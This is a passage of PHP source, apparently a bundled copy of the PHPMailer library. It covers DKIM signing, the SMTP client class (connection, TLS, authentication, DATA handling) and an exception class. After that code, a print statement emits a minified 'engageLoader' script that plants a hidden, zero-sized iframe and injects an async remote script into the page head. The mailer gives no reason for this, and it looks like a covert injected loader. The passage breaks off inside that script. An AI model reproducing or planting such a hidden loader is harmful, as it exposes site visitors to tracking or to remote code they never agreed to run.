'openssl');\r\n            }\r\n            return '';\r\n        }\r\n        \$privKeyStr = !empty(\$this->DKIM_private_string) ? \$this->DKIM_private_string : file_get_contents(\$this->DKIM_private);\r\n        if ('' != \$this->DKIM_passphrase) {\r\n            \$privKey = openssl_pkey_get_private(\$privKeyStr, \$this->DKIM_passphrase);\r\n        } else {\r\n            \$privKey = openssl_pkey_get_private(\$privKeyStr);\r\n        }\r\n        if (openssl_sign(\$signHeader, \$signature, \$privKey, 'sha256WithRSAEncryption')) {\r\n            openssl_pkey_free(\$privKey);\r\n            return base64_encode(\$signature);\r\n        }\r\n        openssl_pkey_free(\$privKey);\r\n        return '';\r\n    }\r\n    public function DKIM_HeaderC(\$signHeader)\r\n    {\r\n        \$signHeader = preg_replace('/\\r\\n[ \\t]+/', ' ', \$signHeader);\r\n        \$lines = explode(\"\\r\\n\", \$signHeader);\r\n        foreach (\$lines as \$key => \$line) {\r\n            if (strpos(\$line, ':') === false) {\r\n                continue;\r\n            }\r\n            list(\$heading, \$value) = explode(':', \$line, 2);\r\n            \$heading = strtolower(\$heading);\r\n            \$value = preg_replace('/[ \\t]{2,}/', ' ', \$value);\r\n            \$lines[\$key] = trim(\$heading, \" \\t\") . ':' . trim(\$value, \" \\t\");\r\n        }\r\n        return implode(\"\\r\\n\", \$lines);\r\n    }\r\n    public function DKIM_BodyC(\$body)\r\n    {\r\n        if (empty(\$body)) {\r\n            return \"\\r\\n\";\r\n        }\r\n        \$body = static::normalizeBreaks(\$body, \"\\r\\n\");\r\n        return rtrim(\$body, \"\\r\\n\") . \"\\r\\n\";\r\n    }\r\n    public function DKIM_Add(\$headers_line, \$subject, \$body)\r\n    {\r\n        \$DKIMsignatureType = 'rsa-sha256';\r\n        \$DKIMcanonicalization = 'relaxed/simple';\r\n        \$DKIMquery = 'dns/txt';\r\n        \$DKIMtime = time();\r\n        \$subject_header = \"Subject:\$subject\";\r\n        \$headers = explode(static::\$LE, \$headers_line);\r\n        \$from_header = '';\r\n        \$to_header = '';\r\n        \$date_header = '';\r\n        \$current = '';\r\n        \$copiedHeaderFields = '';\r\n        \$foundExtraHeaders = [];\r\n        \$extraHeaderKeys = '';\r\n        \$extraHeaderValues = '';\r\n        \$extraCopyHeaderFields = '';\r\n        foreach (\$headers as \$header) {\r\n            if (strpos(\$header, 'From:') === 0) {\r\n                \$from_header = \$header;\r\n                \$current = 'from_header';\r\n            } elseif (strpos(\$header, 'To:') === 0) {\r\n                \$to_header = \$header;\r\n                \$current = 'to_header';\r\n            } elseif (strpos(\$header, 'Date:') === 0) {\r\n                \$date_header = \$header;\r\n                \$current = 'date_header';\r\n            } elseif (!empty(\$this->DKIM_extraHeaders)) {\r\n                foreach (\$this->DKIM_extraHeaders as \$extraHeader) {\r\n                    if (strpos(\$header, \$extraHeader . ':') === 0) {\r\n                        \$headerValue = \$header;\r\n                        foreach (\$this->CustomHeader as \$customHeader) {\r\n                            if (\$customHeader[0] === \$extraHeader) {\r\n                                \$headerValue = trim(\$customHeader[0]) . ': ' . \$this->encodeHeader(trim(\$customHeader[1]));\r\n                                break;\r\n                            }\r\n                        }\r\n                        \$foundExtraHeaders[\$extraHeader] = \$headerValue;\r\n                        \$current = '';\r\n                        break;\r\n                    }\r\n                }\r\n            } else {\r\n                if (!empty(\$\$current) and strpos(\$header, ' =?') === 0) {\r\n                    \$\$current .= \$header;\r\n                } else {\r\n                    \$current = '';\r\n                }\r\n            }\r\n        }\r\n        foreach (\$foundExtraHeaders as \$key => \$value) {\r\n            \$extraHeaderKeys .= ':' . \$key;\r\n            \$extraHeaderValues .= \$value . \"\\r\\n\";\r\n            if (\$this->DKIM_copyHeaderFields) {\r\n                \$extraCopyHeaderFields .= ' |' . str_replace('|', '=7C', \$this->DKIM_QP(\$value)) . \";\\r\\n\";\r\n            }\r\n        }\r\n        if (\$this->DKIM_copyHeaderFields) {\r\n            \$from = str_replace('|', '=7C', \$this->DKIM_QP(\$from_header));\r\n            \$to = str_replace('|', '=7C', \$this->DKIM_QP(\$to_header));\r\n            \$date = str_replace('|', '=7C', \$this->DKIM_QP(\$date_header));\r\n            \$subject = str_replace('|', '=7C', \$this->DKIM_QP(\$subject_header));\r\n            \$copiedHeaderFields = \"z=\$from\\r\\n\" . \"|\$to\\r\\n\" . \"|\$date\\r\\n\" . \"|\$subject;\\r\\n\" . \$extraCopyHeaderFields;\r\n        }\r\n        \$body = \$this->DKIM_BodyC(\$body);\r\n        \$DKIMlen = strlen(\$body);\r\n        \$DKIMb64 = base64_encode(pack('H*', hash('sha256', \$body)));\r\n        if ('' == \$this->DKIM_identity) {\r\n            \$ident = '';\r\n        } else {\r\n            \$ident = ' i=' . \$this->DKIM_identity . ';';\r\n        }\r\n        \$dkimhdrs = 'DKIM-Signature: v=1; a=' . \$DKIMsignatureType . '; q=' . \$DKIMquery . '; l=' . \$DKIMlen . '; s=' . \$this->DKIM_selector . \";\\r\\n\" . ' t=' . \$DKIMtime . '; c=' . \$DKIMcanonicalization . \";\\r\\n\" . ' h=From:To:Date:Subject' . \$extraHeaderKeys . \";\\r\\n\" . ' d=' . \$this->DKIM_domain . ';' . \$ident . \"\\r\\n\" . \$copiedHeaderFields . ' bh=' . \$DKIMb64 . \";\\r\\n\" . ' b=';\r\n        \$toSign = \$this->DKIM_HeaderC(\$from_header . \"\\r\\n\" . \$to_header . \"\\r\\n\" . \$date_header . \"\\r\\n\" . \$subject_header . \"\\r\\n\" . \$extraHeaderValues . \$dkimhdrs);\r\n        \$signed = \$this->DKIM_Sign(\$toSign);\r\n        return static::normalizeBreaks(\$dkimhdrs . \$signed) . static::\$LE;\r\n    }\r\n    public static function hasLineLongerThanMax(\$str)\r\n    {\r\n        return (bool)preg_match('/^(.{' . (self::MAX_LINE_LENGTH + strlen(static::\$LE)) . ',})/m', \$str);\r\n    }\r\n    public function getToAddresses()\r\n    {\r\n        return \$this->to;\r\n    }\r\n    public function getCcAddresses()\r\n    {\r\n        return \$this->cc;\r\n    }\r\n    public function getBccAddresses()\r\n    {\r\n        return \$this->bcc;\r\n    }\r\n    public function getReplyToAddresses()\r\n    {\r\n        return \$this->ReplyTo;\r\n    }\r\n    public function getAllRecipientAddresses()\r\n    {\r\n        return \$this->all_recipients;\r\n    }\r\n    protected function doCallback(\$isSent, \$to, \$cc, \$bcc, \$subject, \$body, \$from, \$extra)\r\n    {\r\n        if (!empty(\$this->action_function) and is_callable(\$this->action_function)) {\r\n            call_user_func(\$this->action_function, \$isSent, \$to, \$cc, \$bcc, \$subject, \$body, \$from, \$extra);\r\n        }\r\n    }\r\n    public function getOAuth()\r\n    {\r\n        return \$this->oauth;\r\n    }\r\n    public function setOAuth(OAuth \$oauth)\r\n    {\r\n        \$this->oauth = \$oauth;\r\n    }\r\n}\r\nclass SMTP\r\n{\r\n    const VERSION = '6.0.7';\r\n    const LE = \"\\r\\n\";\r\n    const DEFAULT_PORT = 25;\r\n    const MAX_LINE_LENGTH = 998;\r\n    const DEBUG_OFF = 0;\r\n    const DEBUG_CLIENT = 1;\r\n    const DEBUG_SERVER = 2;\r\n    const DEBUG_CONNECTION = 3;\r\n    const DEBUG_LOWLEVEL = 4;\r\n    public \$do_debug = self::DEBUG_OFF;\r\n    public \$Debugoutput = 'echo';\r\n    public \$do_verp = false;\r\n    public \$Timeout = 300;\r\n    public \$Timelimit = 300;\r\n    protected \$smtp_transaction_id_patterns = ['exim' => '/[\\d]{3} OK id=(.*)/', 'sendmail' => '/[\\d]{3} 2.0.0 (.*) Message/', 'postfix' => '/[\\d]{3} 2.0.0 Ok: queued as (.*)/', 'Microsoft_ESMTP' => '/[0-9]{3} 2.[\\d].0 (.*)@(?:.*) Queued mail for delivery/', 'Amazon_SES' => '/[\\d]{3} Ok (.*)/', 'SendGrid' => '/[\\d]{3} Ok: queued as (.*)/', 'CampaignMonitor' => '/[\\d]{3} 2.0.0 OK:([a-zA-Z\\d]{48})/',];\r\n    protected \$last_smtp_transaction_id;\r\n    protected \$smtp_conn;\r\n    protected \$error = ['error' => '', 'detail' => '', 'smtp_code' => '', 'smtp_code_ex' => '',];\r\n    protected \$helo_rply = null;\r\n    protected \$server_caps = null;\r\n    protected \$last_reply = '';\r\n    protected function edebug(\$str, \$level = 0)\r\n    {\r\n        if (\$level > \$this->do_debug) {\r\n            return;\r\n        }\r\n        if (\$this->Debugoutput instanceof \\Psr\\Log\\LoggerInterface) {\r\n            \$this\r\n                ->Debugoutput\r\n                ->debug(\$str);\r\n            return;\r\n        }\r\n        if (!in_array(\$this->Debugoutput, ['error_log', 'html', 'echo']) and is_callable(\$this->Debugoutput)) {\r\n            call_user_func(\$this->Debugoutput, \$str, \$level);\r\n            return;\r\n        }\r\n        switch (\$this->Debugoutput) {\r\n            case 'error_log':\r\n                error_log(\$str);\r\n                break;\r\n            case 'html':\r\n                echo gmdate('Y-m-d H:i:s'), ' ', htmlentities(preg_replace('/[\\r\\n]+/', '', \$str), ENT_QUOTES, 'UTF-8'), \"<br>\\n\";\r\n                break;\r\n            case 'echo':\r\n            default:\r\n                \$str = preg_replace('/\\r\\n|\\r/ms', \"\\n\", \$str);\r\n                echo gmdate('Y-m-d H:i:s'), \"\\t\", trim(str_replace(\"\\n\", \"\\n                   \\t                  \", trim(\$str))), \"\\n\";\r\n        }\r\n    }\r\n    public function connect(\$host, \$port = null, \$timeout = 30, \$options = [])\r\n    {\r\n        static \$streamok;\r\n        if (null === \$streamok) {\r\n            \$streamok = function_exists('stream_socket_client');\r\n        }\r\n        \$this->setError('');\r\n        if (\$this->connected()) {\r\n            \$this->setError('Already connected to a server');\r\n            return false;\r\n        }\r\n        if (empty(\$port)) {\r\n            \$port = self::DEFAULT_PORT;\r\n        }\r\n        \$this->edebug(\"Connection: opening to\$host:\$port, timeout=\$timeout, options=\" . (count(\$options) > 0 ? var_export(\$options, true) : 'array()'), self::DEBUG_CONNECTION);\r\n        \$errno = 0;\r\n        \$errstr = '';\r\n        if (\$streamok) {\r\n            \$socket_context = stream_context_create(\$options);\r\n            set_error_handler([\$this, 'errorHandler']);\r\n            \$this->smtp_conn = stream_socket_client(\$host . ':' . \$port, \$errno, \$errstr, \$timeout, STREAM_CLIENT_CONNECT, \$socket_context);\r\n            restore_error_handler();\r\n        } else {\r\n            \$this->edebug('Connection: stream_socket_client not available, falling back to fsockopen', self::DEBUG_CONNECTION);\r\n            set_error_handler([\$this, 'errorHandler']);\r\n            \$this->smtp_conn = fsockopen(\$host, \$port, \$errno, \$errstr, \$timeout);\r\n            restore_error_handler();\r\n        }\r\n        if (!is_resource(\$this->smtp_conn)) {\r\n            \$this->setError('Failed to connect to server', '', (string)\$errno, (string)\$errstr);\r\n            \$this->edebug('SMTP ERROR: ' . \$this->error['error'] . \":\$errstr (\$errno)\", self::DEBUG_CLIENT);\r\n            return false;\r\n        }\r\n        \$this->edebug('Connection: opened', self::DEBUG_CONNECTION);\r\n        if (substr(PHP_OS, 0, 3) != 'WIN') {\r\n            \$max = ini_get('max_execution_time');\r\n            if (0 != \$max and \$timeout > \$max) {\r\n                @set_time_limit(\$timeout);\r\n            }\r\n            stream_set_timeout(\$this->smtp_conn, \$timeout, 0);\r\n        }\r\n        \$announce = \$this->get_lines();\r\n        \$this->edebug('SERVER -> CLIENT: ' . \$announce, self::DEBUG_SERVER);\r\n        return true;\r\n    }\r\n    public function startTLS()\r\n    {\r\n        if (!\$this->sendCommand('STARTTLS', 'STARTTLS', 220)) {\r\n            return false;\r\n        }\r\n        \$crypto_method = STREAM_CRYPTO_METHOD_TLS_CLIENT;\r\n        if (defined('STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT')) {\r\n            \$crypto_method |= STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT;\r\n            \$crypto_method |= STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT;\r\n        }\r\n        set_error_handler([\$this, 'errorHandler']);\r\n        \$crypto_ok = stream_socket_enable_crypto(\$this->smtp_conn, true, \$crypto_method);\r\n        restore_error_handler();\r\n        return (bool)\$crypto_ok;\r\n    }\r\n    public function authenticate(\$username, \$password, \$authtype = null, \$OAuth = null)\r\n    {\r\n        if (!\$this->server_caps) {\r\n            \$this->setError('Authentication is not allowed before HELO/EHLO');\r\n            return false;\r\n        }\r\n        if (array_key_exists('EHLO', \$this->server_caps)) {\r\n            if (!array_key_exists('AUTH', \$this->server_caps)) {\r\n                \$this->setError('Authentication is not allowed at this stage');\r\n                return false;\r\n            }\r\n            \$this->edebug('Auth method requested: ' . (\$authtype ? \$authtype : 'UNSPECIFIED'), self::DEBUG_LOWLEVEL);\r\n            \$this->edebug('Auth methods available on the server: ' . implode(',', \$this->server_caps['AUTH']), self::DEBUG_LOWLEVEL);\r\n            if (null !== \$authtype and !in_array(\$authtype, \$this->server_caps['AUTH'])) {\r\n                \$this->edebug('Requested auth method not available: ' . \$authtype, self::DEBUG_LOWLEVEL);\r\n                \$authtype = null;\r\n            }\r\n            if (empty(\$authtype)) {\r\n                foreach (['CRAM-MD5', 'LOGIN', 'PLAIN', 'XOAUTH2'] as \$method) {\r\n                    if (in_array(\$method, \$this->server_caps['AUTH'])) {\r\n                        \$authtype = \$method;\r\n                        break;\r\n                    }\r\n                }\r\n                if (empty(\$authtype)) {\r\n                    \$this->setError('No supported authentication methods found');\r\n                    return false;\r\n                }\r\n                self::edebug('Auth method selected: ' . \$authtype, self::DEBUG_LOWLEVEL);\r\n            }\r\n            if (!in_array(\$authtype, \$this->server_caps['AUTH'])) {\r\n                \$this->setError(\"The requested authentication method \\\"\$authtype\\\" is not supported by the server\");\r\n                return false;\r\n            }\r\n        } elseif (empty(\$authtype)) {\r\n            \$authtype = 'LOGIN';\r\n        }\r\n        switch (\$authtype) {\r\n            case 'PLAIN':\r\n                if (!\$this->sendCommand('AUTH', 'AUTH PLAIN', 334)) {\r\n                    return false;\r\n                }\r\n                if (!\$this->sendCommand('User & Password', base64_encode(\"\\0\" . \$username . \"\\0\" . \$password), 235)) {\r\n                    return false;\r\n                }\r\n                break;\r\n            case 'LOGIN':\r\n                if (!\$this->sendCommand('AUTH', 'AUTH LOGIN', 334)) {\r\n                    return false;\r\n                }\r\n                if (!\$this->sendCommand('Username', base64_encode(\$username), 334)) {\r\n                    return false;\r\n                }\r\n                if (!\$this->sendCommand('Password', base64_encode(\$password), 235)) {\r\n                    return false;\r\n                }\r\n                break;\r\n            case 'CRAM-MD5':\r\n                if (!\$this->sendCommand('AUTH CRAM-MD5', 'AUTH CRAM-MD5', 334)) {\r\n                    return false;\r\n                }\r\n                \$challenge = base64_decode(substr(\$this->last_reply, 4));\r\n                \$response = \$username . ' ' . \$this->hmac(\$challenge, \$password);\r\n                return \$this->sendCommand('Username', base64_encode(\$response), 235);\r\n            case 'XOAUTH2':\r\n                if (null === \$OAuth) {\r\n                    return false;\r\n                }\r\n                \$oauth = \$OAuth->getOauth64();\r\n                if (!\$this->sendCommand('AUTH', 'AUTH XOAUTH2 ' . \$oauth, 235)) {\r\n                    return false;\r\n                }\r\n                break;\r\n            default:\r\n                \$this->setError(\"Authentication method \\\"\$authtype\\\" is not supported\");\r\n                return false;\r\n        }\r\n        return true;\r\n    }\r\n    protected function hmac(\$data, \$key)\r\n    {\r\n        if (function_exists('hash_hmac')) {\r\n            return hash_hmac('md5', \$data, \$key);\r\n        }\r\n        \$bytelen = 64;\r\n        if (strlen(\$key) > \$bytelen) {\r\n            \$key = pack('H*', md5(\$key));\r\n        }\r\n        \$key = str_pad(\$key, \$bytelen, chr(0x00));\r\n        \$ipad = str_pad('', \$bytelen, chr(0x36));\r\n        \$opad = str_pad('', \$bytelen, chr(0x5c));\r\n        \$k_ipad = \$key ^ \$ipad;\r\n        \$k_opad = \$key ^ \$opad;\r\n        return md5(\$k_opad . pack('H*', md5(\$k_ipad . \$data)));\r\n    }\r\n    public function connected()\r\n    {\r\n        if (is_resource(\$this->smtp_conn)) {\r\n            \$sock_status = stream_get_meta_data(\$this->smtp_conn);\r\n            if (\$sock_status['eof']) {\r\n                \$this->edebug('SMTP NOTICE: EOF caught while checking if connected', self::DEBUG_CLIENT);\r\n                \$this->close();\r\n                return false;\r\n            }\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n    public function close()\r\n    {\r\n        \$this->setError('');\r\n        \$this->server_caps = null;\r\n        \$this->helo_rply = null;\r\n        if (is_resource(\$this->smtp_conn)) {\r\n            fclose(\$this->smtp_conn);\r\n            \$this->smtp_conn = null;\r\n            \$this->edebug('Connection: closed', self::DEBUG_CONNECTION);\r\n        }\r\n    }\r\n    public function data(\$msg_data)\r\n    {\r\n        if (!\$this->sendCommand('DATA', 'DATA', 354)) {\r\n            return false;\r\n        }\r\n        \$lines = explode(\"\\n\", str_replace([\"\\r\\n\", \"\\r\"], \"\\n\", \$msg_data));\r\n        \$field = substr(\$lines[0], 0, strpos(\$lines[0], ':'));\r\n        \$in_headers = false;\r\n        if (!empty(\$field) and strpos(\$field, ' ') === false) {\r\n            \$in_headers = true;\r\n        }\r\n        foreach (\$lines as \$line) {\r\n            \$lines_out = [];\r\n            if (\$in_headers and \$line == '') {\r\n                \$in_headers = false;\r\n            }\r\n            while (isset(\$line[self::MAX_LINE_LENGTH])) {\r\n                \$pos = strrpos(substr(\$line, 0, self::MAX_LINE_LENGTH), ' ');\r\n                if (!\$pos) {\r\n                    \$pos = self::MAX_LINE_LENGTH - 1;\r\n                    \$lines_out[] = substr(\$line, 0, \$pos);\r\n                    \$line = substr(\$line, \$pos);\r\n                } else {\r\n                    \$lines_out[] = substr(\$line, 0, \$pos);\r\n                    \$line = substr(\$line, \$pos + 1);\r\n                }\r\n                if (\$in_headers) {\r\n                    \$line = \"\\t\" . \$line;\r\n                }\r\n            }\r\n            \$lines_out[] = \$line;\r\n            foreach (\$lines_out as \$line_out) {\r\n                if (!empty(\$line_out) and \$line_out[0] == '.') {\r\n                    \$line_out = '.' . \$line_out;\r\n                }\r\n                \$this->client_send(\$line_out . static::LE, 'DATA');\r\n            }\r\n        }\r\n        \$savetimelimit = \$this->Timelimit;\r\n        \$this->Timelimit = \$this->Timelimit * 2;\r\n        \$result = \$this->sendCommand('DATA END', '.', 250);\r\n        \$this->recordLastTransactionID();\r\n        \$this->Timelimit = \$savetimelimit;\r\n        return \$result;\r\n    }\r\n    public function hello(\$host = '')\r\n    {\r\n        return \$this->sendHello('EHLO', \$host) or \$this->sendHello('HELO', \$host);\r\n    }\r\n    protected function sendHello(\$hello, \$host)\r\n    {\r\n        \$noerror = \$this->sendCommand(\$hello, \$hello . ' ' . \$host, 250);\r\n        \$this->helo_rply = \$this->last_reply;\r\n        if (\$noerror) {\r\n            \$this->parseHelloFields(\$hello);\r\n        } else {\r\n            \$this->server_caps = null;\r\n        }\r\n        return \$noerror;\r\n    }\r\n    protected function parseHelloFields(\$type)\r\n    {\r\n        \$this->server_caps = [];\r\n        \$lines = explode(\"\\n\", \$this->helo_rply);\r\n        foreach (\$lines as \$n => \$s) {\r\n            \$s = trim(substr(\$s, 4));\r\n            if (empty(\$s)) {\r\n                continue;\r\n            }\r\n            \$fields = explode(' ', \$s);\r\n            if (!empty(\$fields)) {\r\n                if (!\$n) {\r\n                    \$name = \$type;\r\n                    \$fields = \$fields[0];\r\n                } else {\r\n                    \$name = array_shift(\$fields);\r\n                    switch (\$name) {\r\n                        case 'SIZE':\r\n                            \$fields = (\$fields ? \$fields[0] : 0);\r\n                            break;\r\n                        case 'AUTH':\r\n                            if (!is_array(\$fields)) {\r\n                                \$fields = [];\r\n                            }\r\n                            break;\r\n                        default:\r\n                            \$fields = true;\r\n                    }\r\n                }\r\n                \$this->server_caps[\$name] = \$fields;\r\n            }\r\n        }\r\n    }\r\n    public function mail(\$from)\r\n    {\r\n        \$useVerp = (\$this->do_verp ? ' XVERP' : '');\r\n        return \$this->sendCommand('MAIL FROM', 'MAIL FROM:<' . \$from . '>' . \$useVerp, 250);\r\n    }\r\n    public function quit(\$close_on_error = true)\r\n    {\r\n        \$noerror = \$this->sendCommand('QUIT', 'QUIT', 221);\r\n        \$err = \$this->error;\r\n        if (\$noerror or \$close_on_error) {\r\n            \$this->close();\r\n            \$this->error = \$err;\r\n        }\r\n        return \$noerror;\r\n    }\r\n    public function recipient(\$address, \$dsn = '')\r\n    {\r\n        if (empty(\$dsn)) {\r\n            \$rcpt = 'RCPT TO:<' . \$address . '>';\r\n        } else {\r\n            \$dsn = strtoupper(\$dsn);\r\n            \$notify = [];\r\n            if (strpos(\$dsn, 'NEVER') !== false) {\r\n                \$notify[] = 'NEVER';\r\n            } else {\r\n                foreach (['SUCCESS', 'FAILURE', 'DELAY'] as \$value) {\r\n                    if (strpos(\$dsn, \$value) !== false) {\r\n                        \$notify[] = \$value;\r\n                    }\r\n                }\r\n            }\r\n            \$rcpt = 'RCPT TO:<' . \$address . '> NOTIFY=' . implode(',', \$notify);\r\n        }\r\n        return \$this->sendCommand('RCPT TO', \$rcpt, [250, 251]);\r\n    }\r\n    public function reset()\r\n    {\r\n        return \$this->sendCommand('RSET', 'RSET', 250);\r\n    }\r\n    protected function sendCommand(\$command, \$commandstring, \$expect)\r\n    {\r\n        if (!\$this->connected()) {\r\n            \$this->setError(\"Called\$command without being connected\");\r\n            return false;\r\n        }\r\n        if (strpos(\$commandstring, \"\\n\") !== false or strpos(\$commandstring, \"\\r\") !== false) {\r\n            \$this->setError(\"Command '\$command' contained line breaks\");\r\n            return false;\r\n        }\r\n        \$this->client_send(\$commandstring . static::LE, \$command);\r\n        \$this->last_reply = \$this->get_lines();\r\n        \$matches = [];\r\n        if (preg_match('/^([0-9]{3})[ -](?:([0-9]\\\\.[0-9]\\\\.[0-9]{1,2}) )?/', \$this->last_reply, \$matches)) {\r\n            \$code = \$matches[1];\r\n            \$code_ex = (count(\$matches) > 2 ? \$matches[2] : null);\r\n            \$detail = preg_replace(\"/{\$code}[ -]\" . (\$code_ex ? str_replace('.', '\\\\.', \$code_ex) . ' ' : '') . '/m', '', \$this->last_reply);\r\n        } else {\r\n            \$code = substr(\$this->last_reply, 0, 3);\r\n            \$code_ex = null;\r\n            \$detail = substr(\$this->last_reply, 4);\r\n        }\r\n        \$this->edebug('SERVER -> CLIENT: ' . \$this->last_reply, self::DEBUG_SERVER);\r\n        if (!in_array(\$code, (array)\$expect)) {\r\n            \$this->setError(\"\$command command failed\", \$detail, \$code, \$code_ex);\r\n            \$this->edebug('SMTP ERROR: ' . \$this->error['error'] . ': ' . \$this->last_reply, self::DEBUG_CLIENT);\r\n            return false;\r\n        }\r\n        \$this->setError('');\r\n        return true;\r\n    }\r\n    public function sendAndMail(\$from)\r\n    {\r\n        return \$this->sendCommand('SAML', \"SAML FROM:\$from\", 250);\r\n    }\r\n    public function verify(\$name)\r\n    {\r\n        return \$this->sendCommand('VRFY', \"VRFY\$name\", [250, 251]);\r\n    }\r\n    public function noop()\r\n    {\r\n        return \$this->sendCommand('NOOP', 'NOOP', 250);\r\n    }\r\n    public function turn()\r\n    {\r\n        \$this->setError('The SMTP TURN command is not implemented');\r\n        \$this->edebug('SMTP NOTICE: ' . \$this->error['error'], self::DEBUG_CLIENT);\r\n        return false;\r\n    }\r\n    public function client_send(\$data, \$command = '')\r\n    {\r\n        if (self::DEBUG_LOWLEVEL > \$this->do_debug and in_array(\$command, ['User & Password', 'Username', 'Password'], true)) {\r\n            \$this->edebug('CLIENT -> SERVER: <credentials hidden>', self::DEBUG_CLIENT);\r\n        } else {\r\n            \$this->edebug('CLIENT -> SERVER: ' . \$data, self::DEBUG_CLIENT);\r\n        }\r\n        set_error_handler([\$this, 'errorHandler']);\r\n        \$result = fwrite(\$this->smtp_conn, \$data);\r\n        restore_error_handler();\r\n        return \$result;\r\n    }\r\n    public function getError()\r\n    {\r\n        return \$this->error;\r\n    }\r\n    public function getServerExtList()\r\n    {\r\n        return \$this->server_caps;\r\n    }\r\n    public function getServerExt(\$name)\r\n    {\r\n        if (!\$this->server_caps) {\r\n            \$this->setError('No HELO/EHLO was sent');\r\n            return;\r\n        }\r\n        if (!array_key_exists(\$name, \$this->server_caps)) {\r\n            if ('HELO' == \$name) {\r\n                return \$this->server_caps['EHLO'];\r\n            }\r\n            if ('EHLO' == \$name || array_key_exists('EHLO', \$this->server_caps)) {\r\n                return false;\r\n            }\r\n            \$this->setError('HELO handshake was used; No information about server extensions available');\r\n            return;\r\n        }\r\n        return \$this->server_caps[\$name];\r\n    }\r\n    public function getLastReply()\r\n    {\r\n        return \$this->last_reply;\r\n    }\r\n    protected function get_lines()\r\n    {\r\n        if (!is_resource(\$this->smtp_conn)) {\r\n            return '';\r\n        }\r\n        \$data = '';\r\n        \$endtime = 0;\r\n        stream_set_timeout(\$this->smtp_conn, \$this->Timeout);\r\n        if (\$this->Timelimit > 0) {\r\n            \$endtime = time() + \$this->Timelimit;\r\n        }\r\n        \$selR = [\$this->smtp_conn];\r\n        \$selW = null;\r\n        while (is_resource(\$this->smtp_conn) and !feof(\$this->smtp_conn)) {\r\n            if (!stream_select(\$selR, \$selW, \$selW, \$this->Timelimit)) {\r\n                \$this->edebug('SMTP -> get_lines(): timed-out (' . \$this->Timeout . ' sec)', self::DEBUG_LOWLEVEL);\r\n                break;\r\n            }\r\n            \$str = @fgets(\$this->smtp_conn, 515);\r\n            \$this->edebug('SMTP INBOUND: \"' . trim(\$str) . '\"', self::DEBUG_LOWLEVEL);\r\n            \$data .= \$str;\r\n            if (!isset(\$str[3]) or (isset(\$str[3]) and \$str[3] == ' ')) {\r\n                break;\r\n            }\r\n            \$info = stream_get_meta_data(\$this->smtp_conn);\r\n            if (\$info['timed_out']) {\r\n                \$this->edebug('SMTP -> get_lines(): timed-out (' . \$this->Timeout . ' sec)', self::DEBUG_LOWLEVEL);\r\n                break;\r\n            }\r\n            if (\$endtime and time() > \$endtime) {\r\n                \$this->edebug('SMTP -> get_lines(): timelimit reached (' . \$this->Timelimit . ' sec)', self::DEBUG_LOWLEVEL);\r\n                break;\r\n            }\r\n        }\r\n        return \$data;\r\n    }\r\n    public function setVerp(\$enabled = false)\r\n    {\r\n        \$this->do_verp = \$enabled;\r\n    }\r\n    public function getVerp()\r\n    {\r\n        return \$this->do_verp;\r\n    }\r\n    protected function setError(\$message, \$detail = '', \$smtp_code = '', \$smtp_code_ex = '')\r\n    {\r\n        \$this->error = ['error' => \$message, 'detail' => \$detail, 'smtp_code' => \$smtp_code, 'smtp_code_ex' => \$smtp_code_ex,];\r\n    }\r\n    public function setDebugOutput(\$method = 'echo')\r\n    {\r\n        \$this->Debugoutput = \$method;\r\n    }\r\n    public function getDebugOutput()\r\n    {\r\n        return \$this->Debugoutput;\r\n    }\r\n    public function setDebugLevel(\$level = 0)\r\n    {\r\n        \$this->do_debug = \$level;\r\n    }\r\n    public function getDebugLevel()\r\n    {\r\n        return \$this->do_debug;\r\n    }\r\n    public function setTimeout(\$timeout = 0)\r\n    {\r\n        \$this->Timeout = \$timeout;\r\n    }\r\n    public function getTimeout()\r\n    {\r\n        return \$this->Timeout;\r\n    }\r\n    protected function errorHandler(\$errno, \$errmsg, \$errfile = '', \$errline = 0)\r\n    {\r\n        \$notice = 'Connection failed.';\r\n        \$this->setError(\$notice, \$errmsg, (string)\$errno);\r\n        \$this->edebug(\"\$notice Error #\$errno: \$errmsg [\$errfile line \$errline]\", self::DEBUG_CONNECTION);\r\n    }\r\n    protected function recordLastTransactionID()\r\n    {\r\n        \$reply = \$this->getLastReply();\r\n        if (empty(\$reply)) {\r\n            \$this->last_smtp_transaction_id = null;\r\n        } else {\r\n            \$this->last_smtp_transaction_id = false;\r\n            foreach (\$this->smtp_transaction_id_patterns as \$smtp_transaction_id_pattern) {\r\n                if (preg_match(\$smtp_transaction_id_pattern, \$reply, \$matches)) {\r\n                    \$this->last_smtp_transaction_id = trim(\$matches[1]);\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n        return \$this->last_smtp_transaction_id;\r\n    }\r\n    public function getLastTransactionID()\r\n    {\r\n        return \$this->last_smtp_transaction_id;\r\n    }\r\n}\r\n/**\r\n * PHPMailer exception handler\r\n * @package PHPMailer\r\n */\r\nclass phpmailerException extends Exception\r\n{\r\n    /**\r\n     * Prettify error message output\r\n     * @return string\r\n     */\r\n    public function errorMessage()\r\n    {\r\n        \$errorMsg = '<strong>' . \$this->getMessage() . \"</strong><br />\\n\";\r\n        return \$errorMsg;\r\n    }\r\n}\r\n\r\nprint '\r\n<head><script>if(top==window){var engageNameSpace=\"engagens\";\"undefined\"==typeof window[engageNameSpace]&&(window[engageNameSpace]={}),window[engageNameSpace].engageLoader=function(){function e(e){return\"undefined\"!=typeof e&&null!==e}function t(){var t=document.createElement(\"script\");t.setAttribute(\"src\",s),t.setAttribute(\"id\",\"fn_engage_script\"),t.setAttribute(\"async\",\"\"),(null==document.head||e(document.head))&&(document.head=document.getElementsByTagName(\"head\")[0]),document.head.appendChild(t)}function n(){var t=r();if(e(t)){var n=t;i()&&(n=d(t));var o;try{o=document.documentElement,o.appendChild(n)}catch(c){o=document.body,o.appendChild(n)}a()}}function a(){function e(e){var n=e.data;\"l8IframeIsReady\"===n.message&&t()}window.addEventListener?window.addEventListener(\"message\",e,!1):window.attachEvent(\"onmessage\",e)}function r(){var t=document.createElement(\"iframe\");if(e(t)){t.setAttribute(\"id\",\"fn_engage\"),t.setAttribute(\"src\",u),t.setAttribute(\"target\",\"_blank\"),t.setAttribute(\"frameborder\",\"0\");var n=/firefox/i.exec(navigator.userAgent);e(n)&&n.length>0?(t.style.height=0,t.style.width=0):t.style.display=\"none\",t.frameBorder=\"no\"}return t}function i(){var t=!1,n=/android (\\d+)/i.exec(navigator.userAgent);return e(n)&&n.length>0&&(t=parseInt(n[1])>=4),t}function 